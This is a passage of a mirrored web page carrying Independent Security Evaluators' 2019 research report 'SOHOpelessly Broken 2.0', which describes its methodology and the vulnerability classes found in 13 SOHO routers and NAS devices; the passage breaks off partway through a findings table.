@@ -1,0 +1,2359 @@
+<!doctype html>
+<html lang="en">
+
+
+<!-- Mirrored from www.ise.io/casestudies/sohopelessly-broken-2-0/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 31 Aug 2023 07:27:53 GMT -->
+<head>
+    <title>SOHOpelessly Broken 2.0 - Independent Security Evaluators</title>
+    <meta charset="utf-8">
+	<meta name="description" content="Internet of Things (IoT) devices have always been vulnerable to a variety of security issues. In 2013, Independent Security Evaluators (ISE) performed research on IoT devices that showed how rich feature sets could be leveraged to compromise devices. Today, we show that security controls put in place by device manufacturers are insufficient against attacks carried out by remote adversaries. This research project aimed to uncover and leverage new techniques to circumvent these new security controls in embedded devices." />
+	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="index.html" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="SOHOpelessly Broken 2.0" />
+	<meta property="og:description" content="Internet of Things (IoT) devices have always been vulnerable to a variety of security issues. In 2013, Independent Security Evaluators (ISE) performed research on IoT devices that showed how rich feature sets could be leveraged to compromise devices. Today, we show that security controls put in place by device manufacturers are insufficient against attacks carried out by remote adversaries. This research project aimed to uncover and leverage new techniques to circumvent these new security controls in embedded devices." />
+	<meta property="og:url" content="index.html" />
+	<meta property="og:site_name" content="Independent Security Evaluators" />
+	<meta property="og:image" content="../../assets/img/logo_white_square.png" />
+	<meta name="twitter:card" content="summary_large_image" />
+
+    <!-- Required meta tags -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="ahrefs-site-verification" content="79c692fee3854586781d3f86d234931ba3f5a12705c23db76407351e42aa6757">
+
+    <!-- fonts preload -->
+    <link rel="preload" href="../../assets/fonts/HK%20Grotesk%20Pro/HKGroteskPro-Regular.woff2" as="font" type="font/woff2" crossorigin/>
+    <link rel="preload" href="../../assets/fonts/HK%20Grotesk%20Pro/HKGroteskPro-Medium.woff2" as="font" type="font/woff2" crossorigin/>
+
+
+    <!-- Libs CSS -->
+    <link rel="stylesheet" href="../../assets/fonts/Feather/feather.css">
+    <link rel="stylesheet" href="../../assets/libs/%40fancyapps/fancybox/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="../../assets/libs/aos/dist/aos.css">
+
+    <!-- <link rel="stylesheet" type="text/css" href="../../assets/font-awesome/css/font-awesome.min.css"> -->
+    <link rel="stylesheet" href="../../../unpkg.com/flickity%402.3.0/dist/flickity.min.css">
+    <script src="../../../unpkg.com/flickity%402.3.0/dist/flickity.pkgd.min.js"></script>
+    <!-- <link rel="stylesheet" href="../../assets/libs/choices.js/public/assets/styles/choices.min.css">
+    <link rel="stylesheet" href="../../assets/libs/flickity-fade/flickity-fade.css">
+    <link rel="stylesheet" href="../../assets/libs/flickity/dist/flickity.min.css">
+    <link rel="stylesheet" href="../../assets/libs/highlightjs/styles/vs2015.css">
+    <link rel="stylesheet" href="../../assets/libs/jarallax/dist/jarallax.css">
+    <link rel="stylesheet" href="../../assets/libs/quill/dist/quill.core.css" /> -->
+
+
+    <!-- Font awesome animations -->
+    <script src="../../../kit.fontawesome.com/275cf458c9.js" crossorigin="anonymous"></script> 
+    <link rel="stylesheet" href="../../../cdnjs.cloudflare.com/ajax/libs/font-awesome-animation/0.3.0/font-awesome-animation.min.css" integrity="sha512-Po8rrCwchD03Wo+2ibHFielZ8luDAVoCyE9i6iFMPyn9+V1tIhGk5wl8iKC9/JfDah5Oe9nV8QzE8HHgjgzp3g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <!-- Theme CSS -->
+    <link rel="stylesheet" href="../../assets/css/theme.min.css">
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-HZ2ZZMHS4S"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-HZ2ZZMHS4S');
+    </script>
+
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+      new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+      j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+      '../../../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
+      })(window,document,'script','dataLayer','GTM-TW7J76M');</script>
+    <!-- End Google Tag Manager -->
+
+    <!-- Google Material Icons -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+</head>
+
+<body>
+    
+    <!-- NAVBAR
+    ================================================== -->
+    <nav class="navbar fixed-top navbar-expand-lg navbar-light bg-white">
+      <div class="container">
+
+        <!-- Brand -->
+        <a class="navbar-brand" href="../../index.html">
+          <img src="../../assets/img/brand.svg" class="navbar-brand-img" alt="...">
+        </a>
+
+        <!-- Buttons-->
+        <div>
+          <!-- Start Page Book a Demo Button -->         <!-- Only shows on screen sizes between extra small to medium -->
+          <!--
+          <a class="btn btn-primary btn-sm lift btn-pd-sm d-xs-block d-lg-none" id="navbar-demo-btn" style="display: none;" rel="noopener">
+          Book a Demo</a>-->
+          <!-- Toggler -->
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse"
+            aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+        </div>
+
+        <!-- Collapse -->
+        <div class="collapse navbar-collapse" id="navbarCollapse">
+
+          <!-- Toggler -->
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse"
+            aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+            <i class="fe fe-x"></i>
+          </button>
+
+          <!-- Navigation -->
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarAbout" data-hover="dropdown" href="../../about/values/index.html" aria-haspopup="true"
+                aria-expanded="false">
+                About
+              </a>
+              <div class="dropdown-menu dropdown-menu" aria-labelledby="navbarAbout">
+                <div class="row no-gutters">
+                  <div class="col-12 col-lg-8">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      About ISE
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../about/values/index.html" title="Integrity, Quality, Dedication, Education">
+                      Company Values
+                    </a>                                
+
+                    <a class="dropdown-item" href="../../about/methodology/index.html" title="Learn how we deliver reports">
+                      Methodology
+                    </a>      
+
+                    <a class="dropdown-item" href="../../about/leadership/index.html" title="Independent Security Evaluators">
+                      Leadership
+                    </a>      
+
+                    <a class="dropdown-item" href="../../news/index.html" title="Stay up to date">
+                      News
+                    </a>      
+
+                    <a class="dropdown-item" href="../../careers/index.html" title="Join our team">
+                      Careers
+                    </a>      
+
+                  </div>
+                </div>
+              </div>
+            </li>
+
+
+
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarServices" data-hover="dropdown" href="../../services/vulnerability-assessments/index.html" aria-haspopup="true"
+                aria-expanded="false">
+                Services
+              </a>
+              <div class="dropdown-menu dropdown-menu-lg" aria-labelledby="navbarServices">
+                <div class="row no-gutters">
+                  <div class="col-12 col-lg-6">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Assessments
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../services/vulnerability-assessments/index.html">
+                      Vulnerability Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../services/application-security-assessment/index.html">
+                      Application Security Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../services/cloud-security-assessment/index.html">
+                      Cloud Security Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../services/penetration-testing/index.html">
+                      Penetration Testing
+                    </a>
+                    <a class="dropdown-item" href="../../services/network-penetration-testing/index.html">
+                      Network Penetration Testing
+                    </a>
+                    <a class="dropdown-item mb-5" href="../../services/managed-vulnerability-scanning/index.html">
+                      Vulnerability Scanning
+                    </a>
+                
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Hacking Events
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item mb-5" href="https://www.iotvillage.org/" target="_blank" rel="noopener">
+                      IoT Village <span class="fe fe-external-link"></span>
+                    </a>
+
+                  </div>
+                  <div class="col-12 col-lg-6">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Consulting
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../services/security-consulting-services/index.html">
+                      Security Consulting
+                    </a>
+                    <a class="dropdown-item" href="../../services/independent-verification-and-validation/index.html">
+                      Independent Verification & Validation
+                    </a>
+                    <a class="dropdown-item" href="../../services/secure-design-analysis/index.html">
+                      Secure Design Analysis
+                    </a>
+                    <a class="dropdown-item mb-5" href="../../services/it-consulting-services/index.html">
+                      IT Consulting
+                    </a>
+                
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Training
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../services/training/index.html">
+                      Security Training
+                    </a>
+
+                    <a class="dropdown-item mb-5" href="https://offers.ise.io/ise-application-security-training-workshop" rel="noopener noreferrer" target="_blank">
+                      Hackalong <span class="fe fe-external-link"></span>
+                    </a>
+
+                  </div>
+                </div>
+              </div>
+            </li>
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarResearch" data-hover="dropdown" href="../../research/index.html" aria-haspopup="true"
+                aria-expanded="false">
+                Research
+              </a>
+              <div class="dropdown-menu dropdown-menu" aria-labelledby="navbarResearch">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Research
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../research/index.html" title="Papers & Studies">
+                      Papers & Studies
+                    </a>                                
+
+                    <a class="dropdown-item" href="../../talks/index.html" title="Talks">
+                      Talks
+                    </a>      
+
+                    <a class="dropdown-item" href="../../blog/index.html" title="Hackers Blog">
+                      Hackers Blog
+                    </a>      
+
+                    <a class="dropdown-item" href="https://blog.ise.io/blog" title="Industry Blog" rel="noopener noreferrer" target="_blank">
+                      Industry Blog <span class="fe fe-external-link"></span>
+                    </a>      
+
+                    <a class="dropdown-item" href="../../start/blog/index.html" title="Join our team">
+                      VRM/TPRM Articles
+                    </a>  
+
+                    <a class="dropdown-item" href="../../research/podcast/index.html" title="Join our team">
+                      Podcast
+                    </a>   
+       
+                </div>
+            </li>
+
+            <!-- Start-->
+            <!-- <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarStart" data-hover="dropdown" href="../../start/" aria-haspopup="true"
+                aria-expanded="false">
+                START VRM
+              </a>
+              <div class="dropdown-menu dropdown-menu-md" aria-labelledby="navbarStart">
+                <div class="list-group list-group-flush p-4">
+
+                  <a class="list-group-item" href="../../start/blog/">
+                    <div class="ml-4">
+                      <h6 class="font-weight-bold text-uppercase text-primary mb-0">
+                        Blog
+                      </h6>
+                    </div>
+
+                  </a>
+
+                </div>
+              </div>
+            </li> -->
+        
+            <li class="nav-item dropdown">
+              <a class="nav-link" id="navbarStart" href="../../start/index.html">
+                START - Vendor Risk Management
+              </a>
+            </li>
+
+
+          </ul>
+      
+          <a class="navbar-btn btn btn-sm btn-primary lift ml-auto"
+            href="https://offers.ise.io/ask-an-expert" target="_blank" rel="noopener">
+            Ask an Expert
+          </a>
+
+        </div>
+
+      </div>
+    </nav>
+
+    <!-- CONTENT
+    ================================================== -->
+    
+
+<section class="py-12">
+    <div class="container">
+        <div class="row">
+            <div class="col-12 col-md-12 col-lg-12" id="content">
+                
+
+<article class="post-1547 casestudies type-casestudies status-publish entry">
+	<header class="entry-header">
+		<h1 class="entry-title">SOHOpelessly Broken 2.0</h1>
+		<p class="entry-meta"><time class="entry-time">September 16, 2019</time> </p>
+	</header>
+	<div class="entry-content">
+		<div id="pl-1547" class="panel-layout">
+			<div id="pg-1547-0" class="panel-grid panel-no-style">
+				<div id="pgc-1547-0-0" class="panel-grid-cell">
+					<div id="panel-1547-0-0-0"
+						class="so-panel widget widget_sow-editor panel-first-child panel-last-child widgetopts-SO"
+						data-index="0">
+						<div class="so-widget-sow-editor so-widget-sow-editor-base">
+							<div class="siteorigin-widget-tinymce textwidget">
+								<h3 class="text-center"><strong><em>Security Vulnerabilities in Network
+											Accessible Services</em></strong></h3>
+								<p class="text-center">Research by: Shaun Mirani, Joshua Meyer, <a
+										href="https://twitter.com/RRamgattie" target="_blank"
+										rel="noopener noreferrer">Rick Ramgattie</a>, and Ian Sindermann</p>
+								<p class="text-center"><strong><a
+											href="../../wp-content/uploads/2019/09/sohopelessly_broken_2_independent_security_evaluators.pdf"
+											target="_blank" rel="noopener noreferrer">Download PDF Report</a></strong>
+								</p>
+								<p>&nbsp;</p>
+								<p>&nbsp;</p>
+								<h3><strong>Abstract</strong></h3>
+								<p>Internet of Things (IoT) devices have always been vulnerable to a variety of security
+									issues. In 2013, Independent Security Evaluators (ISE) performed research on IoT
+									devices that showed how rich feature sets could be leveraged to compromise devices.
+									Today, we show that security controls put in place by device manufacturers are
+									insufficient against attacks carried out by remote adversaries. This research
+									project aimed to uncover and leverage new techniques to circumvent these new
+									security controls in embedded devices.</p>
+								<h3><strong>Introduction</strong></h3>
+								<p>Embedded devices are special-purpose computing systems. These types of systems
+									include industrial controllers, small office/home office (SOHO) routers,
+									network-attached storage devices (NAS), and IP cameras. Internet-connected embedded
+									devices are often placed into a broader category referred to as IoT devices.</p>
+								<p>In 2013, we evaluated the security of IoT devices focusing on routers and NAS devices
+									in the small office/home office market. This research was titled SOHOpelessly Broken
+									and demonstrated how extraneous functionality could be leveraged to compromise IoT
+									devices remotely. SOHOpelessly Broken resulted in 52 CVEs issued for newly
+									discovered vulnerabilities.</p>
+								<p>In the current iteration of our research, SOHOpelessly Broken 2.0, we assessed the
+									security of 13 SOHO router and NAS devices and found vulnerabilities resulting in
+									125 CVEs. We focused on these types of devices because of their security
+									implications to networks and because we wanted to see what improvements, if any, had
+									been made to the security performance of these devices since our prior research
+									efforts.</p>
+								<p>Despite the increased attention to security claimed by device manufacturers, these
+									IoT devices do not have sufficient security controls to prevent remote exploitation.
+								</p>
+								<p>This paper begins by introducing the IoT devices that were assessed. Second, we
+									describe the threats we considered and our methodology for assessing each device.
+									Third, we discuss the security controls implemented on the target devices and
+									demonstrate the attacks we used to beat or circumvent these security
+									functionalities. Fourth, we compare our findings to those from our initial research,
+									which we refer to as SOHOpelessly Broken 1.0. Finally, we discuss the responsible
+									disclosure process we used and draw conclusions from our research.</p>
+								<h3>Research Devices</h3>
+								<p>We chose devices from a range of manufacturers so as to best evaluated the industry
+									landscape, rather than draw broader assumptions from a single deep-dive into one
+									brand. Our targets ranged from devices designed for general consumers to high-end
+									devices designed for enterprise use. A majority of the targets’ manufacturers are
+									considered reputable and well-known in the industry; others are from newer companies
+									that are expanding their market share. In addition to these new devices, we included
+									some devices from earlier research to make a determination whether or not
+									manufacturers have improved their security approach or practices over the years.</p>
+								<p>&nbsp;</p>
+								<h4 class="text-center"><b>Devices in SOHOpelessly Broken 2.0</b></h4>
+								<table style="width: 100%; height: 336px;">
+									<tbody>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><b>Device</b>
+											</td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><b>Firmware
+													Version</b></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">Buffalo TeraStation TS5600D1206*</span>
+											</td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">3.61-0.08</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">Synology DS218j</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">6.1.5</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">TerraMaster F2-420</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">3.1.03</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">Zyxel NSA325 v2*</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">4.81</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">Drobo 5N2</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">4.0.5-13.28.96115</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">Asustor AS-602T*</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">3.1.1</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">Seagate STCR3000101</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">4.3.15.1</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">QNAP TS-870*</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">4.3.4.0486</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">Lenovo ix4-300d*</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">4.1.402.34662</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">ASUS RT-AC3200</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">3.0.0.4.382.50010</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">Netgear Nighthawk R9000</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">1.0.3.10</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">TOTOLINK A3002RU V1</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">1.0.8</span></td>
+										</tr>
+										<tr style="height: 24px;">
+											<td style="width: 61.1905%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">Xiaomi Mi Router 3</span></td>
+											<td style="width: 94.5238%; text-align: center; height: 24px;"><span
+													style="font-weight: 400;">2.22.15</span></td>
+										</tr>
+									</tbody>
+								</table>
+								<p class="text-center"><em>*These devices were previously featured in research
+										by ISE</em></p>
+								<p>All 13 of the devices we evaluated had at least one web application vulnerability
+									such as cross-site scripting (XSS), operating system command injection (OS CMDi), or
+									SQL injection (SQLi) that could be leveraged by an attacker to get remote access to
+									the device’s shell or gain access to the device’s administrative panel. We obtained
+									root shells on 12 of the devices, allowing complete control over the device
+									including 6 which can be remotely exploited without authentication: the Asustor
+									AS-602T, Buffalo TeraStation TS5600D1206, TerraMaster F2-420, Drobo 5N2, Netgear
+									Nighthawk R9000, and TOTOLINK A3002RU <span style="font-weight: 400;"> V1</span>.
+								</p>
+								<p><strong>Configuration of Devices</strong><br />
+									Our targets were all updated to the latest supported publicly-available firmware
+									then evaluated from their “out-of-the-box” configuration. This state typically
+									include features designed to make the device easier to use. For example, NASs will
+									typically enable file sharing protocols, and routers may enable services such as
+									uPnP that are designed to facilitate intra-network device communication. We
+									completed any initial setup wizards and enabled any recommended security features
+									when they were presented. Since users commonly utilize these devices with the
+									settings configured during initial setup, we wanted to mimic typical use
+									configurations.The devices that were under evaluation were not purposely made
+									insecure to aid us in vulnerability discovery by disabling default security
+									features. Our goal was not to identify issues with the default configuration of
+									these devices, it was to identify poorly developed functionality.</p>
+								<h3>Methodology</h3>
+								<p>Our objective was to remotely compromise our targets such that we could execute
+									arbitrary system commands and functions with full root-level access without any form
+									of authentication. Before assessing the system to find vulnerabilities that would
+									accomplish our goal, we needed to understand the threats these devices may face.</p>
+								<p><strong>Threats</strong><br />
+									Due to their reputation for poor security and the vantage point of IoT devices on
+									the network they attract a number of threats. These assets face potential
+									adversaries ranging from highly skilled attackers to actors using premade exploit
+									toolchains. We considered authenticated users as well as adversaries on the local
+									network and across the Internet as potential threats.</p>
+								<p>We considered remote adversaries as they may be able to attack devices in a local
+									network, over the Internet through features such as port-forwarding, or because the
+									device is an Internet gateway that accepts request over a wide-area network. Even
+									without such features, adversaries could leverage other devices in an internal
+									network and carry out cross-site request forgery (CSRF) and domain name system (DNS)
+									rebinding attacks.</p>
+								<p>With these threats in mind, we return to our objective: remotely obtaining
+									root-privileged access without any authentication. The following section details our
+									process for finding vulnerabilities in our targets.</p>
+								<p><strong>Assessment Workflow</strong><br />
+									This section covers the steps we took to identify vulnerabilities in our targets.
+									Our intention was to identify potential attack surfaces and vulnerabilities that an
+									advanced, targeted attacker might exploit to gain access to the system or other
+									system specific resources. When necessary, automated tools were used, but more
+									frequently, hands-on manual assessments of application components were performed to
+									ensure that we conducted an accurate and complete review.</p>
+								<p style="text-align: left;">Our assessment process was broken into four phases:</p>
+								<ol style="margin-left: 50px;">
+									<li style="text-align: left;">Reconnaissance</li>
+									<li style="text-align: left;">Service enumeration</li>
+									<li style="text-align: left;">Gaining access</li>
+									<li style="text-align: left;">Exploit development</li>
+								</ol>
+								<p>During the reconnaissance phase, we passively gathered as much information as we
+									could about each device. We looked into the device’s functionality, reviewed its
+									purpose, and completed any initial setup tasks. We also downloaded and requested any
+									open source code the manufacturer may have used. Source code gave us insight into
+									what libraries were used by each device.</p>
+								<p>After initial reconnaissance, we began enumerating the default services available on
+									each device. We focused on network accessible services as we were interested in
+									identifying remotely exploitable vulnerabilities. We documented the version number
+									of each service, mapped each web application, and gathered network traffic.</p>
+								<p>Next, we used what we learned during the service enumeration phase to identify
+									vulnerabilities. When possible, we used shell access to the device during this phase
+									to review source code and binaries used by network accessible services.</p>
+								<p>During the gaining access phase, we audited each device for vulnerabilities that
+									granted us full access to our targets. After identifying vulnerabilities, we built
+									proof-of-concept attacks (PoCs). When building our PoCs, we often combined or
+									“chained” vulnerabilities to reduce the level of access required to remotely
+									compromise a device. For example, we chained CSRF with CMDi to launch attacks that
+									targeted authenticated users and abused their access to remotely compromise their
+									device.</p>
+								<h3>Circumventing Security Controls</h3>
+								<p>In 12 of the 13 devices, we were able to achieve our goal of remote root-level
+									access. The table below shows the types of vulnerabilities we identified in our
+									targets.</p>
+								<p>&nbsp;</p>
+								<table style="width: 100%;">
+									<tbody>
+										<tr>
+											<td style="width: 16.5312%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 7.85908%; border: 1px solid #dddddd; text-align: center;">
+												<b>Buffer Overflow</b>
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+												<b>Cross-Site Scripting</b>
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+												<b>Command Injection</b>
+											</td>
+											<td style="width: 7.04607%; border: 1px solid #dddddd; text-align: center;">
+												<b>SQL injection</b>
+											</td>
+											<td style="width: 11.5628%; border: 1px solid #dddddd; text-align: center;">
+												<b>Authentication Bypass</b>
+											</td>
+											<td style="width: 10.8401%; border: 1px solid #dddddd; text-align: center;">
+												<b>Authorization Bypass</b>
+											</td>
+											<td style="width: 12.4661%; border: 1px solid #dddddd; text-align: center;">
+												<b>Cross-Site Request Forgery</b>
+											</td>
+											<td style="width: 12.3758%; border: 1px solid #dddddd; text-align: center;">
+												<b>File Upload Path Traversal</b>
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; border: 1px solid #dddddd; text-align: center;">
+												<b>Buffalo TeraStation TS5600D1206</b>
+											</td>
+											<td style="width: 7.85908%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 11.5628%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 10.8401%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 12.4661%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 12.3758%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; border: 1px solid #dddddd; text-align: center;">
+												<b>Synology DS218j*</b>
+											</td>
+											<td style="width: 7.85908%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 7.04607%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 11.5628%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 10.8401%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 12.4661%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 12.3758%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; border: 1px solid #dddddd; text-align: center;">
+												<b>ASUS RT-AC3200 </b>
+											</td>
+											<td style="width: 7.85908%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 11.5628%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 10.8401%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 12.4661%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 12.3758%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; border: 1px solid #dddddd; text-align: center;">
+												<b>Netgear Nighthawk R9000</b>
+											</td>
+											<td style="width: 7.85908%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 11.5628%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 10.8401%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 12.4661%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 12.3758%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; border: 1px solid #dddddd; text-align: center;">
+												<b>TerraMaster F2-420</b>
+											</td>
+											<td style="width: 7.85908%; border: 1px solid #dddddd; text-align: center;">
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 11.5628%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 10.8401%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 12.4661%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 12.3758%; border: 1px solid #dddddd; text-align: center;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; text-align: center; border: 1px solid #ddd;">
+												<b>Drobo 5N2**</b>
+											</td>
+											<td style="width: 7.85908%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
